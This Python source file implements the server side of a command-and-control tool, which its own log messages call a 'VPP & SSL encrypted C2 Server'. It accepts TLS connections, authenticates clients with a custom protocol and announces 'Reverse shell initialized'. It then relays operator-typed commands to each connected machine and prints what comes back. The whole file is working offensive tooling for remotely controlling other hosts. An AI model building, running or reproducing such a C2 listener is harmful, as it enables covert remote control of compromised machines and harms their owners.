import ssl
import sys
import queue
import socket
import base64
import threading

from datetime import datetime
from network.NetworkError import NetworkError
from network.vp_protocol.vp_send import vp_send
from network.vp_protocol.vp_recv import vp_recv
from network.vp_protocol.authentication.server import server as vp_server_auth


class Server:
    def __init__(self,
                 host,
                 port,
                 private_key,
                 database_path,
                 certificate,
                 private_pem):
        self.host = host
        self.port = port
        self.private_key = private_key
        self.database_path = database_path
        self.certificate = certificate
        self.private_pem = private_pem

    def run(self):
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=self.certificate,
                                    keyfile=self.private_pem)
            print(f"[*] SSL context loaded")
        except OSError as e:
            raise NetworkError(message=f"[!] SSL context creation error {e}")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.bind((self.host, self.port))
            except (PermissionError, OSError) as e:
                raise NetworkError(message=f"{e}")
            sock.listen(1)
            with context.wrap_socket(sock, server_side=True) as ssock:
                print(f"[*] VPP & SSL encrypted C2 Server listening on ~ "
                      f"{self.host}:{self.port} {self.datestamp()}")
                while True:
                    try:
                        conn, addr = ssock.accept()
                    except (ConnectionError, ConnectionResetError,
                            ssl.SSLError) as e:
                        print(f"\n[!] Client failed to connect "
                              f"{self.datestamp()}")
                        continue
                    try:
                        public_key = vp_server_auth(
                            private_key=self.private_key,
                            database_path=self.database_path,
                            conn=conn,
                            addr=addr,
                            verbose=True)
                    except NetworkError as e:
                        print(f"[!] {addr[0]}:{addr[1]} ~ Authentication "
                              f"failed: {e}")
                        conn.close()
                        continue
                    print(f"[*] {addr[0]}:{addr[1]} ~ Reverse shell "
                          f"initialized {self.datestamp()}")
                    client = threading.Thread(
                        target=self.receive_output,
                        args=(conn, addr, public_key),
                        daemon=True)
                    client.start()
                    try:
                        while True:
                            cmd = input()
                            if not cmd:
                                cmd = ' '
                            vp_send(conn=conn,
                                    message=cmd,
                                    private_key=self.private_key,
                                    public_key=public_key)
                    except NetworkError as e:
                        print(f"[!] {addr[0]}:{addr[1]} ~ Connection error, "
                              f"disconnecting {self.datestamp()}")
                        continue

    def receive_output(self, conn, addr, public_key):
        try:
            while True:
                message = vp_recv(conn=conn,
                                  private_key=self.private_key,
                                  public_key=public_key)
                if not message:
                    raise NetworkError
                else:
                    print(message, end='')
        except NetworkError as e:
            print(f"{addr[0]}:{addr[1]} ~ Error lost connection {e} "
                  f"{self.datestamp()}")
            conn.close()

    @staticmethod
    def datestamp():
        return f"@ {datetime.now().strftime('%m/%d/%Y-%H:%M:%S')}"
